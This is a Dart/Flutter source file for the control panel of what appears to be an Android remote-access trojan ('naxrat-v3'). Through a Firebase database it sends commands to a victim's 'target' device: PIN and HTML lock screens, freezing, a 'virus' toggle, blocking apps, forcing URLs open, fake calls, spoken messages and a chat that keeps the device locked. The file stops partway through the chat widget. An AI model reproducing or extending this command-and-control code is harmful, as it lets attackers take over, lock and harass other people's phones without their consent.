// ═══════════════════════════════════════════════════════════════════════════
//  CONTROL PAGE — WHITE BLUE 3D (DASHBOARD STYLE)
// ═══════════════════════════════════════════════════════════════════════════
import 'dart:async';
import 'dart:convert';
import 'dart:math' show Random;

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

const String kFirebaseUrl = 'https://naxrat-v3-default-rtdb.firebaseio.com';

// ═══════════════════════════════════════════════════════════════════════════
//  PALETTE
// ═══════════════════════════════════════════════════════════════════════════
const Color kBg      = Color(0xFFEEF3F9);
const Color kBgGrad1 = Color(0xFFF5FAFF);
const Color kBgGrad2 = Color(0xFFE6EEF8);
const Color kCard    = Color(0xFFFFFFFF);
const Color kCardAlt = Color(0xFFF5F9FF);
const Color kBorder  = Color(0xFFD6E2F0);
const Color kBorderMid = Color(0xFFC3D4E8);

const Color kIce     = Color(0xFF38BDF8);
const Color kIce2    = Color(0xFF0EA5E9);
const Color kIce3    = Color(0xFF0284C7);
const Color kIceSoft = Color(0xFFE0F2FE);

const Color kText      = Color(0xFF0A2540);
const Color kTextSub   = Color(0xFF4A6582);
const Color kTextMuted = Color(0xFF8FA5BE);

const Color kRed       = Color(0xFFEF4444);
const Color kRedSoft   = Color(0xFFFFF1F2);
const Color kAmber     = Color(0xFFF59E0B);
const Color kAmberSoft = Color(0xFFFFFBEB);
const Color kGreen     = Color(0xFF10B981);
const Color kGreenSoft = Color(0xFFECFDF5);
const Color kPurple    = Color(0xFF8B5CF6);

final List<BoxShadow> _sh1 = [
  BoxShadow(color: const Color(0xFF0A2540).withOpacity(0.06), blurRadius: 2, offset: const Offset(0, 1)),
  BoxShadow(color: const Color(0xFF0A2540).withOpacity(0.04), blurRadius: 4, offset: const Offset(0, 2)),
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.06), blurRadius: 8, offset: const Offset(0, 4)),
];
final List<BoxShadow> _sh2 = [
  BoxShadow(color: const Color(0xFF0A2540).withOpacity(0.06), blurRadius: 4, offset: const Offset(0, 2)),
  BoxShadow(color: const Color(0xFF0A2540).withOpacity(0.05), blurRadius: 8, offset: const Offset(0, 4)),
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.10), blurRadius: 16, offset: const Offset(0, 8)),
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.06), blurRadius: 32, offset: const Offset(0, 16)),
];
final List<BoxShadow> _shPrimary = [
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.40), blurRadius: 12, offset: const Offset(0, 4)),
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.25), blurRadius: 24, offset: const Offset(0, 8)),
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.15), blurRadius: 48, offset: const Offset(0, 16)),
];

class DeviceDetail {
  final String id;
  final String name;
  final int? battery;
  final String country;
  final bool online;
  final int lastSeen;

  DeviceDetail({
    required this.id,
    required this.name,
    required this.battery,
    required this.country,
    required this.online,
    required this.lastSeen,
  });
}

class CommandLog {
  final String action;
  final int ts;
  final bool ok;

  CommandLog({required this.action, required this.ts, required this.ok});
}

class ChatMsg {
  final String id;
  final String sender;
  final String text;
  final int ts;

  ChatMsg({
    required this.id,
    required this.sender,
    required this.text,
    required this.ts,
  });
}

class ControlPage extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final String username;
  final String sessionKey;

  const ControlPage({
    super.key,
    required this.deviceId,
    required this.deviceName,
    required this.username,
    required this.sessionKey,
  });

  @override
  State<ControlPage> createState() => _ControlPageState();
}

class _ControlPageState extends State<ControlPage> {
  DeviceDetail? _device;
  final List<CommandLog> _logs = [];
  bool _isLoading = true;

  Timer? _deviceRefreshTimer;

  List<ChatMsg> _chatMsgs = [];
  Timer? _chatPollTimer;
  final TextEditingController _chatCtrl = TextEditingController();
  final ScrollController _chatScrollCtrl = ScrollController();

  @override
  void initState() {
    super.initState();
    _loadLogs();
    _refreshDevice(showLoading: true);

    _deviceRefreshTimer = Timer.periodic(const Duration(seconds: 5), (_) {
      if (mounted) _refreshDevice();
    });
  }

  @override
  void dispose() {
    _deviceRefreshTimer?.cancel();
    _chatPollTimer?.cancel();
    _chatCtrl.dispose();
    _chatScrollCtrl.dispose();
    super.dispose();
  }

  Future<void> _refreshDevice({bool showLoading = false}) async {
    if (showLoading && mounted) setState(() => _isLoading = true);
    try {
      final res = await http.get(Uri.parse('$kFirebaseUrl/devices/${widget.deviceId}.json'))
          .timeout(const Duration(seconds: 10));

      if (res.statusCode != 200) {
        if (mounted) setState(() => _isLoading = false);
        return;
      }

      final data = jsonDecode(res.body);
      if (data == null) {
        if (mounted) setState(() => _isLoading = false);
        return;
      }

      final now = DateTime.now().millisecondsSinceEpoch;
      int lastSeen = 0;
      final rawSeen = data['last_seen'];
      if (rawSeen is int) lastSeen = rawSeen;
      else if (rawSeen is String) lastSeen = int.tryParse(rawSeen) ?? 0;

      final online = lastSeen > 0 && (now - lastSeen) < 2 * 60 * 1000;
      int? battery;
      final b = data['battery'];
      if (b is int) battery = b;
      else if (b is double) battery = b.toInt();

      if (!mounted) return;
      setState(() {
        _device = DeviceDetail(
          id: widget.deviceId,
          name: data['name']?.toString() ?? 'Unknown Device',
          battery: battery,
          country: data['country']?.toString() ?? '—',
          online: online,
          lastSeen: lastSeen,
        );
        _isLoading = false;
      });
    } catch (e) {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  Future<void> _loadLogs() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final raw = prefs.getString('cmd_logs_${widget.deviceId}');
      if (raw == null) return;
      final list = jsonDecode(raw) as List;
      if (!mounted) return;
      setState(() {
        _logs.clear();
        for (final item in list) {
          _logs.add(CommandLog(
            action: item['action']?.toString() ?? '',
            ts: (item['ts'] as num?)?.toInt() ?? 0,
            ok: item['ok'] == true,
          ));
        }
      });
    } catch (_) {}
  }

  Future<void> _addLog(String action, bool ok) async {
    setState(() {
      _logs.insert(0, CommandLog(action: action, ts: DateTime.now().millisecondsSinceEpoch, ok: ok));
      if (_logs.length > 10) _logs.removeLast();
    });
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('cmd_logs_${widget.deviceId}',
          jsonEncode(_logs.map((l) => {'action': l.action, 'ts': l.ts, 'ok': l.ok}).toList()));
    } catch (_) {}
  }

  Future<bool> _sendCommand(String action, [Map<String, dynamic> payload = const {}]) async {
    if (_device == null) { _showSnack('Device tidak ditemukan', error: true); return false; }
    if (!_device!.online) { _showSnack('Device sedang offline', error: true); return false; }

    final cmdId = 'cmd_${DateTime.now().millisecondsSinceEpoch}_${Random().nextInt(999999)}';
    final cmd = {
      'action': action,
      'payload': payload,
      'ts': DateTime.now().millisecondsSinceEpoch,
      'status': 'pending',
    };

    try {
      final res = await http.put(
        Uri.parse('$kFirebaseUrl/devices/${widget.deviceId}/commands/$cmdId.json'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(cmd),
      ).timeout(const Duration(seconds: 10));

      if (res.statusCode == 200 || res.statusCode == 204) {
        await _addLog(action, true);
        return true;
      } else {
        await _addLog(action, false);
        _showSnack('Firebase HTTP ${res.statusCode}', error: true);
        return false;
      }
    } catch (e) {
      await _addLog(action, false);
      _showSnack('Gagal: $e', error: true);
      return false;
    }
  }

  String _timeAgo(int ts) {
    if (ts == 0) return '—';
    final diff = DateTime.now().millisecondsSinceEpoch - ts;
    if (diff < 0) return 'baru';
    final sec = diff ~/ 1000;
    if (sec < 60) return '${sec}s';
    final min = sec ~/ 60;
    if (min < 60) return '${min}m';
    final hr = min ~/ 60;
    if (hr < 24) return '${hr}j';
    return '${hr ~/ 24}h';
  }

  void _showSnack(String msg, {bool error = false, bool success = false}) {
    if (!mounted) return;
    final color = error ? kRed : (success ? kGreen : kIce2);
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: kCard,
      content: Row(children: [
        Icon(error ? Icons.error_outline : Icons.check_circle_outline, color: color, size: 20),
        const SizedBox(width: 10),
        Expanded(child: Text(msg, style: const TextStyle(color: kText, fontWeight: FontWeight.w600, fontSize: 13))),
      ]),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12), side: BorderSide(color: kBorder, width: 1.5)),
      margin: const EdgeInsets.all(16),
      duration: const Duration(seconds: 2),
    ));
  }

  Future<void> _handleAction(String act) async {
    HapticFeedback.mediumImpact();

    switch (act) {
      case 'lock': _showLockDialog(); break;
      case 'unlock': if (await _sendCommand('unlock')) _showSnack('UNLOCK OK', success: true); break;
      case 'custom_lock': _showCustomLockDialog(); break;
      case 'custom_lock_html': _showHtmlLockDialog(); break;
      case 'lcd_on': if (await _sendCommand('lcd_on')) _showSnack('LCD ON OK', success: true); break;
      case 'lcd_off': if (await _sendCommand('lcd_off')) _showSnack('LCD OFF OK', success: true); break;
      case 'chat_lock_on': _openChat(); break;
      case 'chat_lock_off': if (await _sendCommand('chat_lock_off')) _showSnack('CHAT LOCK OFF OK', success: true); break;
      case 'freeze_on': if (await _sendCommand('freeze_on')) _showSnack('FREEZE ON OK', success: true); break;
      case 'freeze_off': if (await _sendCommand('freeze_off')) _showSnack('FREEZE OFF OK', success: true); break;
      case 'blank_on': if (await _sendCommand('blank_on')) _showSnack('BLANK ON OK', success: true); break;
      case 'blank_off': if (await _sendCommand('blank_off')) _showSnack('BLANK OFF OK', success: true); break;
      case 'ambacong_on': if (await _sendCommand('ambacong_on')) _showSnack('AMBACONG ON OK', success: true); break;
      case 'ambacong_off': if (await _sendCommand('ambacong_off')) _showSnack('AMBACONG OFF OK', success: true); break;
      case 'virus_amba_on': if (await _sendCommand('virus_amba_on')) _showSnack('VIRUS ON OK', success: true); break;
      case 'virus_amba_off': if (await _sendCommand('virus_amba_off')) _showSnack('VIRUS OFF OK', success: true); break;
      case 'keyboard_on': if (await _sendCommand('keyboard_on')) _showSnack('KEYBOARD ON OK', success: true); break;
      case 'keyboard_off': if (await _sendCommand('keyboard_off')) _showSnack('KEYBOARD OFF OK', success: true); break;
      case 'video_on': if (await _sendCommand('video_on')) _showSnack('VIDEO ON OK', success: true); break;
      case 'video_off': if (await _sendCommand('video_off')) _showSnack('VIDEO OFF OK', success: true); break;
      case 'flash_on': if (await _sendCommand('flash_on')) _showSnack('FLASH ON OK', success: true); break;
      case 'flash_off': if (await _sendCommand('flash_off')) _showSnack('FLASH OFF OK', success: true); break;
      case 'flash_blink': if (await _sendCommand('flash_blink')) _showSnack('FLASH BLINK OK', success: true); break;
      case 'play_sound': _showSoundDialog(); break;
      case 'stop_sound': if (await _sendCommand('stop_sound')) _showSnack('SOUND STOP OK', success: true); break;
      case 'wallpaper': _showWallpaperDialog(); break;
      case 'prank_call': _showPrankDialog(); break;
      case 'open_url': _showUrlDialog(); break;
      case 'vibrate': _showVibrateDialog(); break;
      case 'tts': _showTtsDialog(); break;
      case 'block_app': _showBlockAppDialog(); break;
      case 'unblock_all': if (await _sendCommand('unblock_all')) _showSnack('UNBLOCK ALL OK', success: true); break;
    }
  }

  void _showLockDialog() {
    final pinCtrl = TextEditingController();
    final msgCtrl = TextEditingController(text: 'Perangkat ini terkunci.');
    _showDialog(
      title: 'LOCK DEVICE', subtitle: 'Device target akan terkunci dengan PIN.',
      children: [
        _dialogField('PIN (4-8 digit)', pinCtrl, keyboard: TextInputType.number),
        _dialogField('Pesan', msgCtrl, maxLines: 3),
      ],
      confirmLabel: 'KUNCI',
      onConfirm: () async {
        final pin = pinCtrl.text.trim();
        final msg = msgCtrl.text.trim();
        if (pin.length < 4 || int.tryParse(pin) == null) { _showSnack('PIN minimal 4 digit angka', error: true); return false; }
        if (msg.isEmpty) { _showSnack('Pesan kosong', error: true); return false; }
        final ok = await _sendCommand('lock', {'pin': pin, 'message': msg});
        if (ok) _showSnack('LOCK OK', success: true);
        return ok;
      },
    );
  }

  void _showCustomLockDialog() {
    final durCtrl = TextEditingController(text: '60');
    _showDialog(
      title: 'CUSTOM LOCK', subtitle: 'Kunci sementara lalu buka otomatis.',
      children: [_dialogField('Durasi (detik)', durCtrl, keyboard: TextInputType.number)],
      confirmLabel: 'KUNCI',
      onConfirm: () async {
        final dur = int.tryParse(durCtrl.text.trim());
        if (dur == null || dur < 5 || dur > 3600) { _showSnack('Durasi 5-3600 detik', error: true); return false; }
        final ok = await _sendCommand('custom_lock', {'duration': dur});
        if (ok) _showSnack('CUSTOM LOCK OK', success: true);
        return ok;
      },
    );
  }

  void _showHtmlLockDialog() {
    final htmlCtrl = TextEditingController();
    _showDialog(
      title: 'HTML LOCK', subtitle: 'Tulis HTML untuk lock screen.',
      children: [_dialogField('Kode HTML', htmlCtrl, maxLines: 6)],
      confirmLabel: 'KUNCI',
      onConfirm: () async {
        final html = htmlCtrl.text.trim();
        if (html.isEmpty) { _showSnack('HTML kosong', error: true); return false; }
        final ok = await _sendCommand('custom_lock_html', {'html': html});
        if (ok) _showSnack('HTML LOCK OK', success: true);
        return ok;
      },
    );
  }

  void _showUrlDialog() {
    final urlCtrl = TextEditingController();
    _showDialog(
      title: 'BUKA URL', subtitle: 'Buka website di browser target.',
      children: [_dialogField('URL', urlCtrl, keyboard: TextInputType.url)],
      confirmLabel: 'BUKA',
      onConfirm: () async {
        var url = urlCtrl.text.trim();
        if (url.isEmpty) { _showSnack('URL kosong', error: true); return false; }
        if (!url.startsWith('http')) url = 'https://$url';
        final ok = await _sendCommand('open_url', {'url': url});
        if (ok) _showSnack('URL OK', success: true);
        return ok;
      },
    );
  }

  void _showVibrateDialog() {
    final durCtrl = TextEditingController(text: '2000');
    _showDialog(
      title: 'VIBRATE DEVICE', subtitle: 'Getarkan HP target.',
      children: [_dialogField('Durasi (ms)', durCtrl, keyboard: TextInputType.number)],
      confirmLabel: 'GETARKAN',
      onConfirm: () async {
        final dur = int.tryParse(durCtrl.text.trim());
        if (dur == null || dur < 100 || dur > 60000) { _showSnack('Durasi 100-60000 ms', error: true); return false; }
        final ok = await _sendCommand('vibrate', {'duration': dur});
        if (ok) _showSnack('VIBRATE OK', success: true);
        return ok;
      },
    );
  }

  void _showSoundDialog() {
    final urlCtrl = TextEditingController();
    _showDialog(
      title: 'PLAY SOUND', subtitle: 'Putar audio dari URL di target.',
      children: [_dialogField('URL Audio', urlCtrl, keyboard: TextInputType.url)],
      confirmLabel: 'PUTAR',
      onConfirm: () async {
        var url = urlCtrl.text.trim();
        if (url.isEmpty) { _showSnack('URL kosong', error: true); return false; }
        if (!url.startsWith('http')) url = 'https://$url';
        final ok = await _sendCommand('play_sound', {'url': url});
        if (ok) _showSnack('SOUND OK', success: true);
        return ok;
      },
    );
  }

  void _showWallpaperDialog() {
    final urlCtrl = TextEditingController();
    _showDialog(
      title: 'SET WALLPAPER', subtitle: 'Masukkan URL gambar untuk wallpaper.',
      children: [
        _dialogField('URL Gambar', urlCtrl, keyboard: TextInputType.url),
        const Padding(
          padding: EdgeInsets.only(top: 4),
          child: Text('Contoh: https://example.com/image.jpg',
            style: TextStyle(color: kTextMuted, fontSize: 11)),
        ),
      ],
      confirmLabel: 'PASANG',
      onConfirm: () async {
        var url = urlCtrl.text.trim();
        if (url.isEmpty) { _showSnack('URL kosong', error: true); return false; }
        if (!url.startsWith('http')) url = 'https://$url';
        final ok = await _sendCommand('wallpaper', {'url': url});
        if (ok) _showSnack('WALLPAPER OK', success: true);
        return ok;
      },
    );
  }

  void _showPrankDialog() {
    final nameCtrl = TextEditingController(text: 'Mama');
    final numCtrl = TextEditingController(text: '+62 812-3456-7890');
    _showDialog(
      title: 'PRANK CALL', subtitle: 'Simulasi panggilan masuk.',
      children: [
        _dialogField('Nama Penelepon', nameCtrl),
        _dialogField('Nomor', numCtrl, keyboard: TextInputType.phone),
      ],
      confirmLabel: 'PANGGIL',
      onConfirm: () async {
        final name = nameCtrl.text.trim();
        final num = numCtrl.text.trim();
        final ok = await _sendCommand('prank_call', {'name': name, 'number': num});
        if (ok) _showSnack('PRANK OK', success: true);
        return ok;
      },
    );
  }

  void _showBlockAppDialog() {
    final pkgCtrl = TextEditingController();
    _showDialog(
      title: 'BLOCK APP', subtitle: 'Masukkan package name app target.',
      children: [
        _dialogField('Package Name', pkgCtrl, hint: 'com.whatsapp'),
        const Padding(
          padding: EdgeInsets.only(top: 4),
          child: Text('Contoh: com.whatsapp • com.instagram.android',
            style: TextStyle(color: kTextMuted, fontSize: 11)),
        ),
      ],
      confirmLabel: 'BLOCK',
      onConfirm: () async {
        final pkg = pkgCtrl.text.trim();
        if (pkg.isEmpty) { _showSnack('Package kosong', error: true); return false; }
        final ok = await _sendCommand('block_app', {'app': pkg, 'name': pkg});
        if (ok) _showSnack('BLOCKED: $pkg', success: true);
        return ok;
      },
    );
  }

  void _showTtsDialog() {
    final textCtrl = TextEditingController();
    String lang = 'id';
    String rate = '1.0';

    showDialog(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (context, setStateDialog) {
          return Dialog(
            backgroundColor: Colors.transparent,
            child: Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: kCard,
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: kBorder, width: 1.5),
                boxShadow: _sh2,
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  const Text('TEXT TO SPEECH', style: TextStyle(
                    fontFamily: 'Orbitron', fontSize: 16, color: kText, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
                  const SizedBox(height: 6),
                  const Text('Target bakal ngomong teks yang kamu ketik.',
                    style: TextStyle(fontSize: 12, color: kTextSub)),
                  const SizedBox(height: 16),
                  _dialogField('Teks', textCtrl, maxLines: 3, maxLength: 300),
                  const SizedBox(height: 10),
                  const Text('BAHASA', style: TextStyle(
                    fontSize: 12, color: kText, fontWeight: FontWeight.bold, letterSpacing: 1)),
                  const SizedBox(height: 6),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                      color: kCardAlt,
                      border: Border.all(color: kBorderMid, width: 1.5),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        value: lang, isExpanded: true, dropdownColor: kCard,
                        style: const TextStyle(fontSize: 14, color: kText),
                        icon: const Icon(Icons.arrow_drop_down, color: kTextSub, size: 24),
                        items: const [
                          DropdownMenuItem(value: 'id', child: Text('Indonesia')),
                          DropdownMenuItem(value: 'en', child: Text('Inggris')),
                          DropdownMenuItem(value: 'ja', child: Text('Jepang')),
                          DropdownMenuItem(value: 'ko', child: Text('Korea')),
                          DropdownMenuItem(value: 'zh', child: Text('Mandarin')),
                        ],
                        onChanged: (v) { if (v != null) setStateDialog(() => lang = v); },
                      ),
                    ),
                  ),
                  const SizedBox(height: 10),
                  const Text('KECEPATAN', style: TextStyle(
                    fontSize: 12, color: kText, fontWeight: FontWeight.bold, letterSpacing: 1)),
                  const SizedBox(height: 6),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                      color: kCardAlt,
                      border: Border.all(color: kBorderMid, width: 1.5),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        value: rate, isExpanded: true, dropdownColor: kCard,
                        style: const TextStyle(fontSize: 14, color: kText),
                        icon: const Icon(Icons.arrow_drop_down, color: kTextSub, size: 24),
                        items: const [
                          DropdownMenuItem(value: '0.7', child: Text('Lambat')),
                          DropdownMenuItem(value: '1.0', child: Text('Normal')),
                          DropdownMenuItem(value: '1.5', child: Text('Cepat')),
                          DropdownMenuItem(value: '2.0', child: Text('Sangat Cepat')),
                        ],
                        onChanged: (v) { if (v != null) setStateDialog(() => rate = v); },
                      ),
                    ),
                  ),
                  const SizedBox(height: 20),
                  Row(
                    children: [
                      Expanded(child: GestureDetector(
                        onTap: () => Navigator.pop(ctx),
                        child: Container(
                          padding: const EdgeInsets.symmetric(vertical: 12),
                          decoration: BoxDecoration(
                            color: kCardAlt,
                            border: Border.all(color: kBorder, width: 1.5),
                            borderRadius: BorderRadius.circular(10),
                          ),
                          child: const Center(child: Text('BATAL', style: TextStyle(
                            fontSize: 12, color: kTextSub, fontWeight: FontWeight.bold, letterSpacing: 1))),
                        ),
                      )),
                      const SizedBox(width: 12),
                      Expanded(child: GestureDetector(
                        onTap: () async {
                          final text = textCtrl.text.trim();
                          if (text.isEmpty) { _showSnack('Teks kosong', error: true); return; }
                          Navigator.pop(ctx);
                          final ok = await _sendCommand('tts', {'text': text, 'lang': lang, 'rate': double.parse(rate)});
                          if (ok) _showSnack('TTS OK', success: true);
                        },
                        child: Container(
                          padding: const EdgeInsets.symmetric(vertical: 12),
                          decoration: BoxDecoration(
                            gradient: const LinearGradient(colors: [kIce, kIce2]),
                            borderRadius: BorderRadius.circular(10),
                            boxShadow: _shPrimary,
                          ),
                          child: const Center(child: Text('NGOMONG', style: TextStyle(
                            fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 1))),
                        ),
                      )),
                    ],
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  void _showDialog({
    required String title,
    required String subtitle,
    required List<Widget> children,
    required String confirmLabel,
    required Future<bool> Function() onConfirm,
  }) {
    showDialog(
      context: context,
      builder: (ctx) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: kCard,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: kBorder, width: 1.5),
            boxShadow: _sh2,
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Text(title, style: const TextStyle(
                fontFamily: 'Orbitron', fontSize: 16, color: kText, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Text(subtitle, style: const TextStyle(fontSize: 12, color: kTextSub)),
              const SizedBox(height: 16),
              ...children,
              const SizedBox(height: 18),
              Row(
                children: [
                  Expanded(child: GestureDetector(
                    onTap: () => Navigator.pop(ctx),
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      decoration: BoxDecoration(
                        color: kCardAlt,
                        border: Border.all(color: kBorder, width: 1.5),
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: const Center(child: Text('BATAL', style: TextStyle(
                        fontSize: 12, color: kTextSub, fontWeight: FontWeight.bold, letterSpacing: 1))),
                    ),
                  )),
                  const SizedBox(width: 12),
                  Expanded(child: GestureDetector(
                    onTap: () async {
                      final ok = await onConfirm();
                      if (ok && ctx.mounted) Navigator.pop(ctx);
                    },
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      decoration: BoxDecoration(
                        gradient: const LinearGradient(colors: [kIce, kIce2]),
                        borderRadius: BorderRadius.circular(10),
                        boxShadow: _shPrimary,
                      ),
                      child: Center(child: Text(confirmLabel, style: const TextStyle(
                        fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 1))),
                    ),
                  )),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _dialogField(String label, TextEditingController ctrl, {TextInputType keyboard = TextInputType.text, int maxLines = 1, int? maxLength, String? hint}) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(label, style: const TextStyle(
            fontSize: 12, color: kText, fontWeight: FontWeight.bold, letterSpacing: 1)),
          const SizedBox(height: 6),
          TextField(
            controller: ctrl,
            keyboardType: keyboard,
            maxLines: maxLines,
            maxLength: maxLength,
            style: const TextStyle(fontSize: 14, color: kText, fontWeight: FontWeight.w600),
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: const TextStyle(color: kTextMuted),
              filled: true, fillColor: kCardAlt,
              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(10),
                borderSide: const BorderSide(color: kBorder, width: 1.5),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(10),
                borderSide: const BorderSide(color: kBorder, width: 1.5),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(10),
                borderSide: const BorderSide(color: kIce2, width: 2),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Future<void> _openChat() async {
    if (_device == null || !_device!.online) { _showSnack('Device offline', error: true); return; }
    await _sendCommand('chat_lock_on');
    if (!mounted) return;
    setState(() => _chatMsgs = []);
    _startChatPolling();
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (_) => _buildChatSheet(),
    ).whenComplete(() => _stopChatPolling());
  }

  void _startChatPolling() {
    _stopChatPolling();
    _loadChatMessages();
    _chatPollTimer = Timer.periodic(const Duration(seconds: 2), (_) => _loadChatMessages());
  }

  void _stopChatPolling() {
    _chatPollTimer?.cancel();
    _chatPollTimer = null;
  }

  Future<void> _loadChatMessages() async {
    try {
      final res = await http.get(Uri.parse('$kFirebaseUrl/devices/${widget.deviceId}/chat_lock.json'));
      if (res.statusCode != 200) return;
      final data = jsonDecode(res.body);
      if (data == null) return;
      final list = <ChatMsg>[];
      (data as Map<String, dynamic>).forEach((id, raw) {
        if (raw == null) return;
        final m = raw as Map<String, dynamic>;
        list.add(ChatMsg(
          id: id,
          sender: m['sender']?.toString() ?? 'unknown',
          text: m['text']?.toString() ?? '',
          ts: (m['ts'] as num?)?.toInt() ?? 0,
        ));
      });
      list.sort((a, b) => a.ts.compareTo(b.ts));
      if (!mounted) return;
      final hasNew = list.length != _chatMsgs.length;
      setState(() => _chatMsgs = list);
      if (hasNew) {
        Future.delayed(const Duration(milliseconds: 100), () {
          if (_chatScrollCtrl.hasClients) {
            _chatScrollCtrl.animateTo(
              _chatScrollCtrl.position.maxScrollExtent,
              duration: const Duration(milliseconds: 250),
              curve: Curves.easeOut,
            );
          }
        });
      }
    } catch (_) {}
  }

  Future<void> _sendChatMessage() async {
    final text = _chatCtrl.text.trim();
    if (text.isEmpty) return;
    final id = 'msg_${DateTime.now().millisecondsSinceEpoch}_${Random().nextInt(99999)}';
    try {
      final res = await http.put(
        Uri.parse('$kFirebaseUrl/devices/${widget.deviceId}/chat_lock/$id.json'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'sender': 'admin', 'text': text, 'ts': DateTime.now().millisecondsSinceEpoch}),
      );
      if (res.statusCode == 200 || res.statusCode == 204) {
        _chatCtrl.clear();
        await _sendCommand('chat_lock_notify', {'msg': text, 'id': id});
      }
    } catch (e) {
      _showSnack('Gagal kirim chat', error: true);
    }
  }

  Widget _buildChatSheet() {
    return Padding(
      padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom),
      child: Container(
        height: MediaQuery.of(context).size.height * 0.7,
        decoration: const BoxDecoration(
          color: kBg,
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: const BoxDecoration(
                gradient: LinearGradient(colors: [kIce, kIce2]),
                borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.chat_bubble_rounded, color: Colors.white, size: 24),
                  const SizedBox(width: 12),
                  Expanded(child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(_device?.name ?? 'Target', style: const TextStyle(
                        fontFamily: 'Orbitron', fontSize: 16, color: Colors.white, fontWeight: FontWeight.w900)),
                      const Text('CHAT LOCK', style: TextStyle(
                        fontSize: 10, color: Colors.white, letterSpacing: 1)),
                    ],
                  )),
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(6),
                      decoration: BoxDecoration(
                        color: kRed,
                        borderRadius: BorderRadius.circular(6),
                      ),
                      child: const Icon(Icons.close_rounded, color: Colors.white, size: 20),
                    ),
                  ),
                ],
              ),
            ),
            Expanded(
              child: _chatMsgs.isEmpty
                  ? const Center(child: Text('BELUM ADA PESAN', style: TextStyle(
                      fontSize: 14, color: kTextMuted, fontWeight: FontWeight.bold)))
                  : ListView.builder(
                      controller: _chatScrollCtrl,
                      padding: const EdgeInsets.all(16),
                      itemCount: _chatMsgs.length,
                      itemBuilder: (_, i) => _buildChatBubble(_chatMsgs[i]),
                    ),
            ),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: const BoxDecoration(
                color: kCard,
                borderRadius: BorderRadius.vertical(bottom: Radius.circular(20)),
              ),
              child: Row(
                children: [
                  Expanded(
                    child: Container(
                      decoration: BoxDecoration(
                        color: kCardAlt,
                        border: Border.all(color: kBorder, width: 1.5),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: TextField(
                        controller: _chatCtrl,
                        style: const TextStyle(fontSize: 14, color: kText),
                        maxLines: 4, minLines: 1,
                        onSubmitted: (_) => _sendChatMessage(),
                        decoration: const InputDecoration(
                          hintText: 'Tulis pesan...',
                          hintStyle: TextStyle(color: kTextMuted),
                          border: InputBorder.none,
                          contentPadding: EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(width: 10),
                  GestureDetector(
                    onTap: _sendChatMessage,
                    child: Container(
                      width: 44, height: 44,
                      // ✅ FIX baris 911: hapus const di BoxDecoration (pakai _shPrimary final)
                      decoration: BoxDecoration(
                        gradient: const LinearGradient(colors: [kIce, kIce2]),
                        shape: BoxShape.circle,
                        boxShadow: _shPrimary,
                      ),
                      child: const Icon(Icons.send_rounded, color: Colors.white, size: 20),
                    ),
                  ),
